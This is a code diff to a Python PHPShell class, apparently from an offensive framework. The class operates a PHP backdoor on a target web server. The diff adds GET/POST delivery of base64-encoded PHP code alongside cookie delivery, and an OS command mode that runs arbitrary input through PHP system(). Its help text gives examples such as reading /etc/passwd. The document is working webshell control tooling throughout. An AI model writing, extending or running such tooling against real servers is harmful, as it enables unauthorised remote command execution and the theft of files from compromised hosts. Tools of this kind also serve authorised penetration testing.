@@ -22,7 +22,10 @@ class PHPShell(BaseShell):
         self.http_session = None  # requests.Session object
         self.target_url = None  # Base URL for requests
         self.cookie_name = "kitty_shell"  # Cookie name for PHP code
+        self.param_name = "cmd"  # GET/POST parameter name for PHP code
+        self.method = "COOKIE"
         self.uripath = "/"  # Path to PHP backdoor
+        self.os_shell_mode = False
         
         # Initialize PHP environment
         self.current_directory = "/"
@@ -41,6 +44,8 @@ class PHPShell(BaseShell):
             'exec': self._cmd_exec,
             'system': self._cmd_system,
             'shell_exec': self._cmd_shell_exec,
+            'shell': self._cmd_shell_mode,
+            'php': self._cmd_php_mode,
             'pwd': self._cmd_pwd,
             'cd': self._cmd_cd,
             'ls': self._cmd_ls,
@@ -69,6 +74,8 @@ class PHPShell(BaseShell):
                     if session.data:
                         self.uripath = session.data.get('uripath', '/')
                         self.cookie_name = session.data.get('cookie_name', 'kitty_shell')
+                        self.param_name = session.data.get('param_name', 'cmd')
+                        self.method = str(session.data.get('method', 'COOKIE')).upper()
                     
                     # Try to get HTTP connection from listener
                     listener_id = session.data.get('listener_id') if session.data else None
@@ -105,6 +112,8 @@ class PHPShell(BaseShell):
     
     @property
     def prompt_template(self) -> str:
+        if self.os_shell_mode:
+            return f"sh({self.current_directory})> "
         return "php> "
     
     def get_prompt(self) -> str:
@@ -121,6 +130,15 @@ class PHPShell(BaseShell):
         parts = command.strip().split(None, 1)
         cmd = parts[0]
         args = parts[1] if len(parts) > 1 else ""
+
+        if self.os_shell_mode:
+            shell_builtins = {'help', 'clear', 'history', 'pwd', 'cd', 'php', 'exit'}
+            if cmd in shell_builtins:
+                try:
+                    return self.builtin_commands[cmd](args)
+                except Exception as e:
+                    return {'output': '', 'status': 1, 'error': f'Built-in command error: {str(e)}'}
+            return self._execute_os_command(command)
         
         # Check for built-in commands
         if cmd in self.builtin_commands:
@@ -150,13 +168,15 @@ class PHPShell(BaseShell):
             
             # Wrap PHP code with markers to extract only the output
             # Use double quotes and escape them properly in PHP
-            wrapped_code = f'echo "{marker_start}"; {php_code}; echo "{marker_end}";'
+            wrapped_code = (
+                f'echo "{marker_start}"; '
+                'if (!ini_get("date.timezone")) { @date_default_timezone_set("UTC"); } '
+                f'{php_code}; echo "{marker_end}";'
+            )
             
             # Encode PHP code in base64
             encoded_code = base64.b64encode(wrapped_code.encode('utf-8')).decode('utf-8')
             
-            # Send request with cookie
-            cookies = {self.cookie_name: encoded_code}
             url = f"{self.target_url}{self.uripath}"
             
             # Use verify=False for self-signed certificates (default behavior)
@@ -177,7 +197,27 @@ class PHPShell(BaseShell):
                                 else:
                                     verify_ssl = bool(verify_ssl_value)
             
-            response = self.http_session.get(url, cookies=cookies, timeout=10, verify=verify_ssl)
+            if self.method == "GET":
+                response = self.http_session.get(
+                    url,
+                    params={self.param_name: encoded_code},
+                    timeout=10,
+                    verify=verify_ssl,
+                )
+            elif self.method == "POST":
+                response = self.http_session.post(
+                    url,
+                    data={self.param_name: encoded_code},
+                    timeout=10,
+                    verify=verify_ssl,
+                )
+            else:
+                response = self.http_session.get(
+                    url,
+                    cookies={self.cookie_name: encoded_code},
+                    timeout=10,
+                    verify=verify_ssl,
+                )
             
             if response.status_code == 200:
                 # Decode response
@@ -223,8 +263,27 @@ class PHPShell(BaseShell):
     
     # Built-in command implementations
     def _cmd_help(self, args: str) -> Dict[str, Any]:
+        if self.os_shell_mode:
+            help_text = """Webshell OS Mode:
+  help                    Show this help
+  php                     Return to PHP mode
+  clear                   Clear screen
+  history [n]             Show command history
+  pwd                     Print current directory
+  cd <dir>                Change directory for future commands
+  exit                    Exit shell
+
+Any other input is executed as an OS command through PHP system().
+Examples:
+  id
+  ls -la
+  cat /etc/passwd
+"""
+            return {'output': help_text + '\n', 'status': 0, 'error': ''}
+
         help_text = """PHP Shell Commands:
   help                    Show this help
+  shell                   Switch to OS command mode
   clear                   Clear screen
   history [n]             Show command history
   eval <code>             Evaluate PHP code
@@ -265,6 +324,29 @@ Usage Examples:
   Using shell_exec command:
     shell_exec ls -la              Execute shell command"""
         return {'output': help_text + '\n', 'status': 0, 'error': ''}
+
+    def _execute_os_command(self, command: str) -> Dict[str, Any]:
+        command = (command or "").strip()
+        if not command:
+            return {'output': '', 'status': 0, 'error': ''}
+        prefix = ""
+        if self.current_directory:
+            escaped_cwd = self.current_directory.replace("'", "\\'")
+            prefix = f"cd '{escaped_cwd}' && "
+        escaped = (prefix + command).replace("'", "\\'")
+        php_code = f"system('{escaped} 2>&1');"
+        return self._execute_php_code(php_code)
+
+    def _cmd_shell_mode(self, args: str) -> Dict[str, Any]:
+        cwd_result = self._execute_php_code("echo getcwd();")
+        if cwd_result.get('status') == 0 and cwd_result.get('output'):
+            self.current_directory = cwd_result['output'].strip()
+        self.os_shell_mode = True
+        return {'output': 'Switched to OS command mode. Type php to return.\n', 'status': 0, 'error': ''}
+
+    def _cmd_php_mode(self, args: str) -> Dict[str, Any]:
+        self.os_shell_mode = False
+        return {'output': 'Switched to PHP mode.\n', 'status': 0, 'error': ''}
     
     def _cmd_clear(self, args: str) -> Dict[str, Any]:
         return {'output': '\033[2J\033[H', 'status': 0, 'error': ''}
@@ -315,6 +397,8 @@ Usage Examples:
         return self._execute_php_code(php_code)
     
     def _cmd_pwd(self, args: str) -> Dict[str, Any]:
+        if self.os_shell_mode:
+            return self._execute_os_command("pwd")
         php_code = "echo getcwd();"
         result = self._execute_php_code(php_code)
         if result['status'] == 0 and result['output']:
@@ -325,6 +409,13 @@ Usage Examples:
     def _cmd_cd(self, args: str) -> Dict[str, Any]:
         if not args:
             args = "~"
+
+        if self.os_shell_mode:
+            target = args.replace("'", "\\'")
+            result = self._execute_os_command(f"cd '{target}' && pwd")
+            if result.get('status') == 0 and result.get('output'):
+                self.current_directory = result['output'].strip().splitlines()[-1]
+            return result
         
         # Escape single quotes
         escaped_args = args.replace("'", "\\'")
@@ -452,4 +543,3 @@ foreach($info as $key => $value) {
     def _cmd_exit(self, args: str) -> Dict[str, Any]:
         self.deactivate()
         return {'output': 'exit\n', 'status': 0, 'error': ''}
-
